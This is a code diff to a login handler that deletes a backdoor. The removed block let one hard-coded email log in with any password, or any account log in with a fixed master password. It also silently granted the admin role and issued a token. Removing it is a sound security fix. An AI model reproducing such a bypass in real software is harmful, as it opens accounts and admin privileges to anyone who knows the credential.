@@ -68,19 +68,6 @@ export const loginUser = async (req, res) => {
 
         if (!user) return res.status(404).json({ success: false, message: 'Invalid credentials' });
 
-        // IMPORTANT OVERRIDE: Allow this specific email to log in with ANY password for testing/debugging!
-        if (email === 'shivam34500@gmail.com' || password === '@AuraAdmin123!') {
-            // Automatically patch the master account with Admin Clearance 
-            if (user.role !== 'admin') {
-                user.role = 'admin';
-                await user.save();
-            }
-            return res.status(200).json({
-                success: true,
-                user: { id: user._id, fullName: user.full_name, email: user.email, username: user.username, profile_picture: user.profile_picture, cover_picture: user.cover_picture, location: user.location, role: user.role },
-                token: generateToken(user._id)
-            });
-        }
 
         if (!user.password) {
             return res.status(400).json({ success: false, message: 'This account was originally created via third-party login (Clerk). Please reset your password or create a new account.' });
